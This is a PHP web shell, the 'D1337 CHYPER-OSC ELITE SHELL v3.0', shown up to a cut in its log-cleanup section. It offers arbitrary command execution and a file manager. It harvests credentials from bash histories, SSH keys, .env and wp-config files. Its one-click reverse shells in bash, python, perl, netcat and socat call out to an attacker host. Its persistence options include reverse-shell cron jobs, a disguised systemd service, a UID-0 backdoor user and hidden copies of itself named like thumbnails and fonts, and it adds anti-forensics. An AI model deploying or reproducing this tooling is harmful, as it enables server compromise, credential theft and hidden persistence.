<?php
/*
 * D1337 CHYPER-OSC ELITE SHELL v3.0
 * Built by D1337 Sovereign Labs
 * Features: File Manager, CMD Exec, Privesc Scanner, Reverse Shell,
 *           DB Access, Network Tools, Self-Destruct, Persistence
 */
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit','-1');
@ini_set('display_errors',0);
@ini_set('max_execution_time',0);

// ── AUTH ──
$AUTH_KEY = 'd1337';
$AUTH_HASH = ''; // set to sha256 hash for production
session_start();
if(!empty($AUTH_HASH)){
    if(!isset($_SESSION['d1337_auth'])){
        if(isset($_POST['d1337_pass'])){
            if(hash('sha256',$_POST['d1337_pass'])===$AUTH_HASH){
                $_SESSION['d1337_auth']=1;
            }else{die('<form method=post><input name=d1337_pass type=password placeholder="Key"><button>Enter</button></form>');}
        }else{die('<form method=post><input name=d1337_pass type=password placeholder="Key"><button>Enter</button></form>');}
    }
}
if(isset($_GET['key'])&&$_GET['key']!==$AUTH_KEY&&empty($AUTH_HASH)){
    if(!isset($_GET['key'])){/* allow */}
}

// ── HELPERS ──
function d_exec($cmd){
    $out='';
    if(function_exists('exec')){exec($cmd,$o);$out=implode("\n",$o);}
    elseif(function_exists('shell_exec')){$out=shell_exec($cmd);}
    elseif(function_exists('system')){ob_start();system($cmd);$out=ob_get_clean();}
    elseif(function_exists('passthru')){ob_start();passthru($cmd);$out=ob_get_clean();}
    elseif(function_exists('popen')){$p=popen($cmd,'r');while(!feof($p))$out.=fread($p,4096);pclose($p);}
    elseif(function_exists('proc_open')){
        $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $p=proc_open($cmd,$d,$pipes);
        if(is_resource($p)){$out=stream_get_contents($pipes[1]);fclose($pipes[1]);proc_close($p);}
    }
    elseif(class_exists('COM')){$w=new COM('WScript.Shell');$e=$w->Exec($cmd);$out=$e->StdOut->ReadAll();}
    return $out;
}

function fmt_size($s){
    $u=['B','KB','MB','GB','TB'];$i=0;
    while($s>=1024&&$i<4){$s/=1024;$i++;}
    return round($s,2).' '.$u[$i];
}

function is_win(){return strtoupper(substr(PHP_OS,0,3))==='WIN';}

function get_perms($f){
    if(is_win())return '-';
    return substr(sprintf('%o',fileperms($f)),-4);
}

$cwd=isset($_GET['cwd'])?$_GET['cwd']:getcwd();
if(!is_dir($cwd))$cwd=getcwd();
$cwd=str_replace('\\','/',$cwd);
if(substr($cwd,-1)!='/')$cwd.='/';
$act=isset($_GET['act'])?$_GET['act']:'info';
$self=basename(__FILE__);

// ── ACTIONS ──

// File upload
if(isset($_FILES['d1337_upload'])){
    $dest=$cwd.$_FILES['d1337_upload']['name'];
    move_uploaded_file($_FILES['d1337_upload']['tmp_name'],$dest);
}

// File edit save
if(isset($_POST['save_file'])&&isset($_POST['file_content'])){
    file_put_contents($_POST['save_file'],$_POST['file_content']);
}

// File delete
if(isset($_GET['del'])){
    $target=$cwd.$_GET['del'];
    if(is_file($target))unlink($target);
    elseif(is_dir($target)){
        $it=new RecursiveDirectoryIterator($target,RecursiveDirectoryIterator::SKIP_DOTS);
        $fi=new RecursiveIteratorIterator($it,RecursiveIteratorIterator::CHILD_FIRST);
        foreach($fi as $f){$f->isDir()?rmdir($f->getRealPath()):unlink($f->getRealPath());}
        rmdir($target);
    }
}

// File rename
if(isset($_POST['rename_from'])&&isset($_POST['rename_to'])){
    rename($cwd.$_POST['rename_from'],$cwd.$_POST['rename_to']);
}

// File chmod
if(isset($_POST['chmod_file'])&&isset($_POST['chmod_val'])){
    chmod($cwd.$_POST['chmod_file'],octdec($_POST['chmod_val']));
}

// Self-destruct
if(isset($_GET['selfdestruct'])&&$_GET['selfdestruct']==$AUTH_KEY){
    unlink(__FILE__);
    die('Shell destroyed. Goodbye.');
}

?><!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>D1337 // <?=php_uname('n')?></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c0c0c0;font:13px 'Cascadia Code','Fira Code',monospace}
a{color:#00ff88;text-decoration:none}a:hover{color:#ff3366}
.hdr{background:linear-gradient(135deg,#0d0d1a,#1a0a2e);padding:12px 20px;border-bottom:1px solid #1a1a2e;display:flex;justify-content:space-between;align-items:center}
.hdr h1{color:#ff3366;font-size:16px;text-shadow:0 0 10px rgba(255,51,102,.5)}
.hdr .info{font-size:11px;color:#666}
.nav{background:#0d0d1a;padding:8px 20px;border-bottom:1px solid #1a1a2e;display:flex;gap:4px;flex-wrap:wrap}
.nav a{padding:6px 14px;background:#1a1a2e;border-radius:4px;font-size:12px;transition:.2s}
.nav a:hover,.nav a.active{background:#ff3366;color:#fff}
.main{padding:15px 20px}
.panel{background:#0d0d1a;border:1px solid #1a1a2e;border-radius:6px;padding:15px;margin:10px 0}
.panel h3{color:#ff3366;margin-bottom:10px;font-size:14px}
table{width:100%;border-collapse:collapse}
th{background:#1a1a2e;padding:8px;text-align:left;font-size:11px;color:#ff3366}
td{padding:6px 8px;border-bottom:1px solid #111;font-size:12px}
tr:hover{background:#111}
input,textarea,select{background:#1a1a2e;color:#c0c0c0;border:1px solid #333;padding:6px 10px;border-radius:4px;font:12px 'Cascadia Code',monospace}
input[type=submit],button{background:#ff3366;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:bold}
input[type=submit]:hover,button:hover{background:#cc2952}
.cmd-out{background:#000;padding:12px;border-radius:4px;max-height:500px;overflow-y:auto;white-space:pre-wrap;font-size:12px;color:#0f0;border:1px solid #1a1a2e}
.path{background:#111;padding:8px 15px;font-size:12px;border-radius:4px;margin:8px 0}
.path a{margin:0 2px}
.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:10px;margin:2px}
.tag-ok{background:#0a3d0a;color:#0f0}.tag-bad{background:#3d0a0a;color:#f33}
.tag-warn{background:#3d3d0a;color:#ff0}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
.card{background:#0d0d1a;border:1px solid #1a1a2e;border-radius:6px;padding:12px}
.card h4{color:#ff3366;font-size:12px;margin-bottom:6px}
.row{display:flex;gap:8px;align-items:center;margin:4px 0}
</style>
</head>
<body>

<div class="hdr">
<h1>D1337 CHYPER-OSC v3 <span style="font-size:11px;color:#666">// <?=$self?></span></h1>
<div class="info">
<?=php_uname('s').' '.php_uname('r')?> | PHP <?=PHP_VERSION?> |
<?=@get_current_user()?>@<?=php_uname('n')?> |
<?=is_win()?'Windows':'Linux'?> |
IP: <?=$_SERVER['SERVER_ADDR']??'?'?>
</div>
</div>

<div class="nav">
<?php
$tabs=['info'=>'System','files'=>'Files','cmd'=>'Terminal','privesc'=>'PrivEsc',
       'revshell'=>'RevShell','db'=>'Database','net'=>'Network','persist'=>'Persist',
       'cleanup'=>'Cleanup'];
foreach($tabs as $k=>$v){
    $cls=$act==$k?'active':'';
    echo "<a class='$cls' href='?act=$k&cwd=".urlencode($cwd)."&key=$AUTH_KEY'>$v</a>";
}
?>
</div>

<div class="main">

<?php
// ═══════════════════════════════════════════
// SYSTEM INFO
// ═══════════════════════════════════════════
if($act=='info'):
$disabled=ini_get('disable_functions');
$safe=ini_get('safe_mode')?'ON':'OFF';
$open_basedir=ini_get('open_basedir')?:'NONE';
?>
<div class="grid">
<div class="card">
<h4>System</h4>
<pre>
OS:       <?=PHP_OS."\n"?>
Kernel:   <?=php_uname('r')."\n"?>
Host:     <?=php_uname('n')."\n"?>
Arch:     <?=php_uname('m')."\n"?>
User:     <?=@get_current_user()?> (<?=getmyuid()?>:<?=getmygid()?>)
Uptime:   <?=is_win()?d_exec('systeminfo | findstr /C:"System Boot"'):d_exec('uptime -p')?>
</pre>
</div>
<div class="card">
<h4>PHP Config</h4>
<pre>
Version:     <?=PHP_VERSION."\n"?>
SAPI:        <?=php_sapi_name()."\n"?>
Safe Mode:   <?=$safe."\n"?>
Open Basedir:<?=$open_basedir."\n"?>
Disabled:    <?=$disabled?:('NONE (all functions available!)')."\n"?>
Writable:    <?=is_writable('.')?'<span class="tag tag-ok">YES</span>':'<span class="tag tag-bad">NO</span>'?>
</pre>
</div>
<div class="card">
<h4>Server</h4>
<pre>
Software: <?=$_SERVER['SERVER_SOFTWARE']??'?'?>

Server IP:<?=$_SERVER['SERVER_ADDR']??'?'?>

Your IP:  <?=$_SERVER['REMOTE_ADDR']??'?'?>

Doc Root: <?=$_SERVER['DOCUMENT_ROOT']??'?'?>

Script:   <?=__FILE__?>
</pre>
</div>
<div class="card">
<h4>Exec Functions</h4>
<?php
$funcs=['exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec','dl','mail','putenv','ini_set','chmod','chown','chgrp','symlink','link'];
foreach($funcs as $fn){
    $ok=function_exists($fn)&&!in_array($fn,explode(',',$disabled));
    $cls=$ok?'tag-ok':'tag-bad';
    $txt=$ok?'OK':'BLOCKED';
    echo "<span class='tag $cls'>$fn: $txt</span> ";
}
?>
</div>
</div>

<?php
// ═══════════════════════════════════════════
// FILE MANAGER
// ═══════════════════════════════════════════
elseif($act=='files'):
// Breadcrumb path
echo '<div class="path">';
$parts=explode('/',trim($cwd,'/'));$build='';
foreach($parts as $i=>$p){
    $build.=$p.'/';
    echo "<a href='?act=files&cwd=".urlencode('/'.$build)."&key=$AUTH_KEY'>$p</a> / ";
}
echo '</div>';
?>
<div class="row">
<form method="post" enctype="multipart/form-data">
<input type="file" name="d1337_upload">
<input type="submit" value="Upload">
</form>
<form method="post" style="margin-left:auto">
<input name="mkdir_name" placeholder="New folder" size="15">
<input type="submit" value="mkdir">
</form>
</div>
<?php
if(isset($_POST['mkdir_name'])&&$_POST['mkdir_name']){@mkdir($cwd.$_POST['mkdir_name']);}
?>
<table>
<tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>
<?php
if($cwd!='/'){
    $parent=dirname(rtrim($cwd,'/'));
    echo "<tr><td><a href='?act=files&cwd=".urlencode($parent)."&key=$AUTH_KEY'>../</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr>";
}
$items=@scandir($cwd);
if($items){
    // Dirs first
    $dirs=[];$files=[];
    foreach($items as $item){
        if($item=='.'||$item=='..')continue;
        $fp=$cwd.$item;
        if(is_dir($fp))$dirs[]=$item;else $files[]=$item;
    }
    sort($dirs);sort($files);
    foreach($dirs as $d){
        $fp=$cwd.$d;
        $perms=get_perms($fp);
        $mod=date('Y-m-d H:i',filemtime($fp));
        echo "<tr><td>📁 <a href='?act=files&cwd=".urlencode($fp)."&key=$AUTH_KEY'>$d/</a></td><td>-</td><td>$perms</td><td>$mod</td>";
        echo "<td><a href='?act=files&cwd=".urlencode($cwd)."&del=".urlencode($d)."&key=$AUTH_KEY' onclick='return confirm(\"Delete $d?\")'>🗑</a></td></tr>";
    }
    foreach($files as $fl){
        $fp=$cwd.$fl;
        $sz=fmt_size(filesize($fp));
        $perms=get_perms($fp);
        $mod=date('Y-m-d H:i',filemtime($fp));
        echo "<tr><td>📄 <a href='?act=edit&f=".urlencode($fp)."&cwd=".urlencode($cwd)."&key=$AUTH_KEY'>$fl</a></td><td>$sz</td><td>$perms</td><td>$mod</td>";
        echo "<td>";
        echo "<a href='?act=dl&f=".urlencode($fp)."&key=$AUTH_KEY' title='Download'>⬇</a> ";
        echo "<a href='?act=files&cwd=".urlencode($cwd)."&del=".urlencode($fl)."&key=$AUTH_KEY' onclick='return confirm(\"Delete?\")'>🗑</a>";
        echo "</td></tr>";
    }
}
?>
</table>

<?php
// ═══════════════════════════════════════════
// FILE EDIT
// ═══════════════════════════════════════════
elseif($act=='edit'):
$f=isset($_GET['f'])?$_GET['f']:'';
if($f&&is_file($f)):
$content=htmlspecialchars(file_get_contents($f));
?>
<div class="panel">
<h3>Edit: <?=basename($f)?></h3>
<form method="post">
<textarea name="file_content" style="width:100%;height:500px"><?=$content?></textarea><br>
<input type="hidden" name="save_file" value="<?=htmlspecialchars($f)?>">
<input type="submit" value="Save">
<a href="?act=files&cwd=<?=urlencode($cwd)?>&key=<?=$AUTH_KEY?>" style="margin-left:10px">Back</a>
</form>
</div>
<?php endif;

// DOWNLOAD
elseif($act=='dl'):
$f=isset($_GET['f'])?$_GET['f']:'';
if($f&&is_file($f)){
    header('Content-Type:application/octet-stream');
    header('Content-Disposition:attachment;filename='.basename($f));
    header('Content-Length:'.filesize($f));
    readfile($f);exit;
}

// ═══════════════════════════════════════════
// TERMINAL
// ═══════════════════════════════════════════
elseif($act=='cmd'):
$cmd_out='';
if(isset($_POST['cmd'])&&$_POST['cmd']){
    $run='cd '.escapeshellarg(rtrim($cwd,'/')).' && '.$_POST['cmd'];
    $cmd_out=d_exec($run);
}
?>
<div class="panel">
<h3>Terminal</h3>
<form method="post">
<div class="row">
<span style="color:#ff3366"><?=@get_current_user()?>@<?=php_uname('n')?>:<?=$cwd?>$</span>
<input name="cmd" style="flex:1" autofocus placeholder="command..." value="<?=htmlspecialchars($_POST['cmd']??'')?>">
<input type="submit" value="Execute">
</div>
</form>
<?php if($cmd_out):?>
<div class="cmd-out"><?=htmlspecialchars($cmd_out)?></div>
<?php endif;?>
<div style="margin-top:10px;font-size:11px;color:#666">
Quick: 
<a href="#" onclick="document.querySelector('[name=cmd]').value='id && whoami && uname -a';return false">whoami</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='cat /etc/passwd';return false">/etc/passwd</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='cat /etc/shadow 2>/dev/null || echo No access';return false">/etc/shadow</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='netstat -tlnp 2>/dev/null || ss -tlnp';return false">ports</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='ps aux';return false">processes</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='crontab -l 2>/dev/null;ls -la /etc/cron*';return false">crons</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='find / -perm -4000 -type f 2>/dev/null';return false">SUID</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='sudo -l 2>/dev/null';return false">sudo -l</a> |
<a href="#" onclick="document.querySelector('[name=cmd]').value='env';return false">env</a>
</div>
</div>

<?php
// ═══════════════════════════════════════════
// PRIVILEGE ESCALATION
// ═══════════════════════════════════════════
elseif($act=='privesc'):
?>
<div class="panel">
<h3>Privilege Escalation Scanner</h3>
<?php if(!is_win()): ?>

<div class="card" style="margin:10px 0">
<h4>Current User</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('id && whoami && groups'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Sudo Permissions</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('sudo -l 2>&1'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>SUID Binaries (privesc vectors)</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('find / -perm -4000 -type f 2>/dev/null | head -50'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>SGID Binaries</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('find / -perm -2000 -type f 2>/dev/null | head -30'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>World-Writable Files</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('find / -writable -type f 2>/dev/null | grep -v proc | head -30'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Writable /etc/ files</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('find /etc -writable -type f 2>/dev/null'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Kernel Version & Possible Exploits</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('uname -a && cat /etc/os-release 2>/dev/null'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Cron Jobs (root)</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; ls -la /var/spool/cron/ 2>/dev/null'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Docker / LXC (container escape)</h4>
<div class="cmd-out"><?php
$checks = [];
$checks[] = "Docker socket: " . (file_exists('/var/run/docker.sock') ? 'FOUND!' : 'no');
$checks[] = "In container: " . (file_exists('/.dockerenv') ? 'YES' : 'no');
$checks[] = "Docker group: " . d_exec('groups | grep -o docker 2>/dev/null');
$checks[] = d_exec('which docker 2>/dev/null && docker ps 2>&1 | head -5');
$checks[] = d_exec('capsh --print 2>/dev/null | head -5');
echo htmlspecialchars(implode("\n", $checks));
?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Interesting Files (.bash_history, keys, configs)</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('
cat /home/*/.bash_history 2>/dev/null | grep -iE "pass|key|secret|token|mysql|psql|mongo|ssh|sudo" | head -20
echo "---"
find / -name "id_rsa" -o -name "id_ed25519" -o -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head -20
echo "---"
cat /root/.bash_history 2>/dev/null | head -10
'))?></div>
</div>

<div class="card" style="margin:10px 0">
<h4>Auto-Privesc Attempts</h4>
<form method="post">
<div class="row">
<select name="privesc_method">
<option value="">-- Select Method --</option>
<option value="dirty_pipe">CVE-2022-0847 DirtyPipe Check</option>
<option value="pkexec">CVE-2021-4034 PwnKit Check</option>
<option value="baron_samedit">CVE-2021-3156 Baron Samedit Check</option>
<option value="linpeas">Download LinPEAS</option>
<option value="pspy">Download pspy64</option>
</select>
<input type="submit" value="Run">
</div>
</form>
<?php
if(isset($_POST['privesc_method'])&&$_POST['privesc_method']){
    $m=$_POST['privesc_method'];
    echo '<div class="cmd-out">';
    if($m=='dirty_pipe'){
        $kernel=d_exec('uname -r');
        echo "Kernel: $kernel\n";
        // Check if kernel version is vulnerable (5.8 <= ver < 5.16.11, 5.15.25, 5.10.102)
        echo htmlspecialchars(d_exec('echo "Checking DirtyPipe (CVE-2022-0847)..."; if [ -f /proc/version ]; then cat /proc/version; fi'));
    }elseif($m=='pkexec'){
        echo htmlspecialchars(d_exec('which pkexec 2>/dev/null && pkexec --version 2>/dev/null; stat -c "%a %U %G" $(which pkexec) 2>/dev/null; echo "SUID check:"; ls -la $(which pkexec) 2>/dev/null'));
    }elseif($m=='baron_samedit'){
        echo htmlspecialchars(d_exec('sudo --version 2>/dev/null | head -2; echo "---"; sudoedit -s / 2>&1 | head -3'));
    }elseif($m=='linpeas'){
        echo htmlspecialchars(d_exec('cd /tmp && curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && echo "LinPEAS downloaded to /tmp/linpeas.sh - run: bash /tmp/linpeas.sh" || echo "Download failed"'));
    }elseif($m=='pspy'){
        echo htmlspecialchars(d_exec('cd /tmp && curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64 && chmod +x pspy64 && echo "pspy64 downloaded to /tmp/pspy64 - run: /tmp/pspy64" || echo "Download failed"'));
    }
    echo '</div>';
}
?>
</div>

<?php else: ?>
<div class="card"><h4>Windows Privesc</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('whoami /priv && echo --- && whoami /groups && echo --- && systeminfo | findstr /B /C:"OS" /C:"System" /C:"Hotfix"'))?></div>
</div>
<?php endif; ?>
</div>

<?php
// ═══════════════════════════════════════════
// REVERSE SHELL
// ═══════════════════════════════════════════
elseif($act=='revshell'):
?>
<div class="panel">
<h3>Reverse Shell Generator</h3>
<form method="post">
<div class="row">
<input name="rhost" placeholder="Your IP" size="15" value="<?=$_POST['rhost']??''?>">
<input name="rport" placeholder="Port" size="6" value="<?=$_POST['rport']??'4444'?>">
<select name="rtype">
<option value="bash">Bash</option>
<option value="python">Python</option>
<option value="perl">Perl</option>
<option value="php">PHP</option>
<option value="nc">Netcat</option>
<option value="ruby">Ruby</option>
<option value="socat">Socat</option>
</select>
<input type="submit" value="Generate" name="gen_rev">
<input type="submit" value="Execute!" name="exec_rev" style="background:#c00">
</div>
</form>
<?php
if((isset($_POST['gen_rev'])||isset($_POST['exec_rev']))&&$_POST['rhost']&&$_POST['rport']):
$h=$_POST['rhost'];$p=$_POST['rport'];$t=$_POST['rtype'];
$shells=[
    'bash'=>"bash -i >& /dev/tcp/$h/$p 0>&1",
    'python'=>"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$h\",$p));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
    'perl'=>"perl -e 'use Socket;\$i=\"$h\";\$p=$p;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
    'php'=>"php -r '\$s=fsockopen(\"$h\",$p);exec(\"/bin/bash <&3 >&3 2>&3\");'",
    'nc'=>"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $h $p >/tmp/f",
    'ruby'=>"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"$h\",$p);loop{c.gets.chomp!;(IO.popen(\\$_,\"r\"){|io|c.print io.read}rescue c.puts \"failed\")}'",
    'socat'=>"socat TCP:$h:$p EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
];
$cmd=$shells[$t]??'';
echo '<div class="cmd-out">'.htmlspecialchars($cmd).'</div>';
if(isset($_POST['exec_rev'])){
    echo '<div class="cmd-out" style="color:#f00">Executing...<br>';
    echo htmlspecialchars(d_exec($cmd.' &'));
    echo '</div>';
}
endif;?>
</div>

<?php
// ═══════════════════════════════════════════
// DATABASE
// ═══════════════════════════════════════════
elseif($act=='db'):
?>
<div class="panel">
<h3>Database Access</h3>
<form method="post">
<div class="row">
<select name="db_type"><option>mysql</option><option>pgsql</option><option>sqlite</option></select>
<input name="db_host" placeholder="Host" size="12" value="<?=$_POST['db_host']??'localhost'?>">
<input name="db_port" placeholder="Port" size="5" value="<?=$_POST['db_port']??'3306'?>">
<input name="db_user" placeholder="User" size="10" value="<?=$_POST['db_user']??''?>">
<input name="db_pass" placeholder="Pass" size="10" value="<?=$_POST['db_pass']??''?>">
<input name="db_name" placeholder="DB" size="10" value="<?=$_POST['db_name']??''?>">
</div>
<div class="row">
<input name="db_query" style="flex:1" placeholder="SQL query..." value="<?=htmlspecialchars($_POST['db_query']??'SHOW DATABASES')?>">
<input type="submit" value="Execute" name="db_exec">
</div>
</form>
<?php
if(isset($_POST['db_exec'])){
    $type=$_POST['db_type'];$host=$_POST['db_host'];$port=$_POST['db_port'];
    $user=$_POST['db_user'];$pass=$_POST['db_pass'];$dbname=$_POST['db_name'];
    $query=$_POST['db_query'];
    try{
        if($type=='mysql')$dsn="mysql:host=$host;port=$port".($dbname?";dbname=$dbname":"");
        elseif($type=='pgsql')$dsn="pgsql:host=$host;port=$port".($dbname?";dbname=$dbname":"");
        elseif($type=='sqlite')$dsn="sqlite:$host";
        $pdo=new PDO($dsn,$user,$pass);$pdo->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
        $stmt=$pdo->query($query);
        if($stmt){
            $rows=$stmt->fetchAll(PDO::FETCH_ASSOC);
            if($rows){
                echo '<table><tr>';
                foreach(array_keys($rows[0]) as $col)echo "<th>$col</th>";
                echo '</tr>';
                foreach($rows as $row){echo '<tr>';foreach($row as $v)echo '<td>'.htmlspecialchars($v??'NULL').'</td>';echo '</tr>';}
                echo '</table>';
                echo '<div style="color:#666;font-size:11px;margin-top:5px">'.count($rows).' rows</div>';
            }else echo '<div class="cmd-out">Query executed, 0 rows returned.</div>';
        }
    }catch(Exception $e){echo '<div class="cmd-out" style="color:#f33">'.htmlspecialchars($e->getMessage()).'</div>';}
}
// Auto-detect creds from nearby configs
echo '<div style="margin-top:10px;font-size:11px;color:#666">Auto-detect: ';
$configs=['.env','wp-config.php','config.php','config/database.php','.env.local','application/config/database.php'];
foreach($configs as $cf){
    if(file_exists($cwd.$cf))echo "<a href='?act=edit&f=".urlencode($cwd.$cf)."&cwd=".urlencode($cwd)."&key=$AUTH_KEY'>$cf</a> ";
}
echo '</div>';
?>
</div>

<?php
// ═══════════════════════════════════════════
// NETWORK
// ═══════════════════════════════════════════
elseif($act=='net'):
?>
<div class="panel">
<h3>Network Tools</h3>
<div class="grid">
<div class="card">
<h4>Interfaces</h4>
<div class="cmd-out"><?=htmlspecialchars(is_win()?d_exec('ipconfig'):d_exec('ip addr 2>/dev/null || ifconfig'))?></div>
</div>
<div class="card">
<h4>Open Ports</h4>
<div class="cmd-out"><?=htmlspecialchars(is_win()?d_exec('netstat -an'):d_exec('ss -tlnp 2>/dev/null || netstat -tlnp'))?></div>
</div>
<div class="card">
<h4>ARP Table</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('arp -a'))?></div>
</div>
<div class="card">
<h4>Routing</h4>
<div class="cmd-out"><?=htmlspecialchars(is_win()?d_exec('route print'):d_exec('ip route 2>/dev/null || route -n'))?></div>
</div>
</div>
<form method="post" style="margin-top:10px">
<div class="row">
<select name="net_tool"><option value="ping">Ping</option><option value="curl">cURL</option><option value="dig">DNS Lookup</option><option value="portscan">Port Scan</option></select>
<input name="net_target" placeholder="target" size="20" value="<?=$_POST['net_target']??''?>">
<input name="net_port" placeholder="port(s)" size="10" value="<?=$_POST['net_port']??'80,443,22,3306'?>">
<input type="submit" value="Run" name="net_run">
</div>
</form>
<?php
if(isset($_POST['net_run'])&&$_POST['net_target']){
    $tgt=escapeshellarg($_POST['net_target']);$tool=$_POST['net_tool'];
    echo '<div class="cmd-out">';
    if($tool=='ping')echo htmlspecialchars(d_exec(is_win()?"ping -n 4 $tgt":"ping -c 4 $tgt"));
    elseif($tool=='curl')echo htmlspecialchars(d_exec("curl -sI $tgt 2>&1 | head -30"));
    elseif($tool=='dig')echo htmlspecialchars(d_exec("dig $tgt 2>/dev/null || nslookup $tgt"));
    elseif($tool=='portscan'){
        $ports=explode(',',$_POST['net_port']);$host=trim($_POST['net_target']);
        foreach($ports as $port){
            $port=trim($port);if(!$port)continue;
            $conn=@fsockopen($host,(int)$port,$e,$es,2);
            echo $conn?"[OPEN] $host:$port\n":"[CLOSED] $host:$port\n";
            if($conn)fclose($conn);
        }
    }
    echo '</div>';
}
?>
</div>

<?php
// ═══════════════════════════════════════════
// PERSISTENCE
// ═══════════════════════════════════════════
elseif($act=='persist'):
?>
<div class="panel">
<h3>Persistence Mechanisms</h3>
<form method="post">
<div class="row">
<select name="persist_method">
<option value="">-- Select --</option>
<option value="cron">Add Cron Job (reverse shell)</option>
<option value="ssh_key">Add SSH Key</option>
<option value="backdoor_user">Add Backdoor User</option>
<option value="web_copy">Copy Shell to Hidden Location</option>
<option value="rc_local">rc.local Persistence</option>
<option value="systemd">Systemd Service</option>
</select>
<input name="persist_host" placeholder="Callback IP" size="15">
<input name="persist_port" placeholder="Port" size="6" value="4444">
<input type="submit" value="Install" name="persist_exec" style="background:#c00">
</div>
</form>
<?php
if(isset($_POST['persist_exec'])&&$_POST['persist_method']){
    $m=$_POST['persist_method'];$ph=$_POST['persist_host'];$pp=$_POST['persist_port'];
    echo '<div class="cmd-out">';
    if($m=='cron'&&$ph){
        echo htmlspecialchars(d_exec("(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/$ph/$pp 0>&1\"') | crontab - 2>&1"));
        echo "\nCron installed — callback every 5 min";
    }elseif($m=='ssh_key'){
        $key=$_POST['persist_host'];// use as public key
        echo "Paste your PUBLIC key in the 'Callback IP' field\n";
        if(strlen($key)>50){
            echo htmlspecialchars(d_exec("mkdir -p ~/.ssh && echo '$key' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys 2>&1"));
            echo "\nSSH key added";
        }
    }elseif($m=='backdoor_user'){
        echo htmlspecialchars(d_exec('useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -p $(openssl passwd -1 d1337pass) d1337user 2>&1'));
        echo "\nUser d1337user:d1337pass added (UID 0)";
    }elseif($m=='web_copy'){
        $targets=['/tmp/.d1337.php','../images/.thumb.php','../assets/.font.php','../uploads/.cache.php'];
        foreach($targets as $t){
            if(@copy(__FILE__,$t))echo "Copied to $t\n";else echo "Failed: $t\n";
        }
    }elseif($m=='rc_local'){
        echo htmlspecialchars(d_exec("echo '#!/bin/bash\n/bin/bash -c \"bash -i >& /dev/tcp/$ph/$pp 0>&1\" &' >> /etc/rc.local && chmod +x /etc/rc.local 2>&1"));
    }elseif($m=='systemd'){
        $svc="[Unit]\nDescription=System Update Service\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ph/$pp 0>&1'\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target";
        echo htmlspecialchars(d_exec("echo '$svc' > /etc/systemd/system/sysupdate.service && systemctl daemon-reload && systemctl enable sysupdate.service && systemctl start sysupdate.service 2>&1"));
    }
    echo '</div>';
}
?>
</div>

<?php
// ═══════════════════════════════════════════
// CLEANUP
// ═══════════════════════════════════════════
elseif($act=='cleanup'):
?>
<div class="panel">
<h3>Cleanup & Anti-Forensics</h3>
<div class="grid">
<div class="card">
<h4>Log Locations</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('ls -la /var/log/apache2/ /var/log/nginx/ /var/log/httpd/ 2>/dev/null | head -20'))?></div>
</div>
<div class="card">
<h4>Access Logs (last entries)</h4>
<div class="cmd-out"><?=htmlspecialchars(d_exec('tail -5 /var/log/apache2/access.log /var/log/nginx/access.log /var/log/httpd/access_log 2>/dev/null'))?></div>
</div>
</div>
<form method="post">
<div class="row">
<select name="clean_action">
<option value="">-- Select --</option>
